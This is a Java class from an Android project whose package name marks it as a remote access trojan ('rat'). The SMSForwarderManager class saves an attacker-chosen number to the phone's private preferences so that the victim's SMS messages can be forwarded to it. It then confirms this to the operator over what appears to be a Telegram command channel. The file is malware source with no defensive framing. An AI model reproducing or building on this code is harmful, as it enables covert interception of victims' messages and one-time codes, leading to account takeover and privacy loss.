package com.enterprise.rat.commands;

import android.content.Context;
import android.telephony.SmsManager;
import com.enterprise.rat.utils.TelegramApi;

public class SMSForwarderManager {
    private Context context;
    public SMSForwarderManager(Context context) { this.context = context; }
    public void setForward(String number) {
        context.getSharedPreferences("REX_PREFS", Context.MODE_PRIVATE).edit().putString("fw_number", number).apply();
        TelegramApi.sendMessage("✅ SMS forwarding to " + number);
    }
}
